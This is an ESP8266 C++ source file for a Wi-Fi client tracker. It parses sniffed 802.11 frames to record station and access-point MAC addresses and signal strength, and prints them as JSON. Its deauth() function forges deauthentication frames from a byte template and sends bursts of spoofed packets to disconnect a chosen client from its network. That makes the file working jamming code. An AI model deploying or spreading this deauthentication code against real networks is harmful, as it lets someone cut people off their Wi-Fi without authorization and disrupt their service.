#include "clients.h"
#include "esp_functions.h"

/*
 *  Send deauth packets to client.
 */
uint8_t deauth_template[26] = {
  0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00
};


Clients::Clients() {
}

/**
 * Decode a received packet
 */
struct clientinfo Clients::parse(uint8_t *frame, uint16_t framelen, signed rssi) {
  struct clientinfo ci;
  ci.err = 0;
  ci.rssi = -rssi;
  int pos = 36;
  
  uint8_t *beacon;
  uint8_t *station;
  uint8_t ds;
  ds = frame[1] & 3;
  switch (ds) {
    case 0:
      beacon = frame + 16;
      station = frame + 10;
      break;
    case 1:
      beacon = frame + 4;
      station = frame + 10;
      break;
    case 2:
      beacon = frame + 10;
      if (memcmp(frame + 4, broadcast1, 3) || memcmp(frame + 4, broadcast2, 3) || memcmp(frame + 4, broadcast3, 3)) {
        station = frame + 16;
      } else {
        station = frame + 4;
      }
      break;
    case 3:
      beacon = frame + 10;
      station = frame + 4;
      break;
  }
  memcpy(ci.station, station, ETH_MAC_LEN);
  memcpy(ci.beacon, beacon, ETH_MAC_LEN);
  ci.seq = frame[23] * 0xFF + (frame[22] & 0xF0);
  return ci;
}

/*
 *  Function that stores information about single client
 */
boolean Clients::store(clientinfo ci) {
  boolean known = false;
  int u;
  
  for (u = 0; u < clients_count; u++) {
    if (!memcmp(clients_known[u].station, ci.station, ETH_MAC_LEN)) {
      known = 1;
      break;
    }
  }
  
  if (known) {
    memcpy(&clients_known[u], &ci, sizeof(ci));
  } else {
    memcpy(&clients_known[clients_index], &ci, sizeof(ci));
    
    if (clients_count < MAX_CLIENTS) clients_count++;
    clients_index++;
    
    if (clients_index == MAX_CLIENTS) clients_index = 0;
  }
  return known;
}

/**
 * Send deasuth packets for the specified client
 */
void Clients::deauth(clientinfo ci) {
  uint8_t packet_buffer[64];
  memcpy(packet_buffer, deauth_template, 26);
  memcpy(packet_buffer + 4, ci.station, ETH_MAC_LEN);
  memcpy(packet_buffer + 10, ci.beacon, ETH_MAC_LEN);
  memcpy(packet_buffer + 16, ci.beacon, ETH_MAC_LEN);
  for (uint8_t i = 0; i < 0x10; i++) {
    uint16_t seq = ci.seq + 0x10 * i;
    packet_buffer[22] = seq % 0xFF;
    packet_buffer[23] = seq / 0xFF;
    wifi_send_pkt_freedom(packet_buffer, 26, 0);
    delay(1);
  }
}

/**
 * lookup a client by MAC address
 */
clientinfo *Clients::find(uint8_t *station) {
    for (int u = 0; u < clients_count; u++) {
      if (memcmp(clients_known[u].station, station, ETH_MAC_LEN) == 0) {   
        return &clients_known[u];
      }
    }
    return NULL;
}

/*
 *   Function that prints single client in JSON format
 */
void Clients::print(clientinfo ci) {
  Serial.print("\"");
  for (int i = 0; i < ETH_MAC_LEN; i++) {
    if (i > 0) Serial.print(":");
    Serial.printf("%02x", ci.station[i]);
  }
  Serial.print("\":{\"beacon\":\"");
  for (int i = 0; i < ETH_MAC_LEN; i++) {
    if (i > 0) Serial.print(":");
    Serial.printf("%02x", ci.beacon[i]);
  }
  Serial.printf("\",\"rssi\":-%d}", ci.rssi);
}

/*
 * Function that prints all clients in JSON format
 */
void Clients::print() {
  Serial.print("{");
  for (int u = 0; u < clients_count; u++) {
    if (u > 0) Serial.print(",");
    print(clients_known[u]);
  }
  Serial.print("}");
}
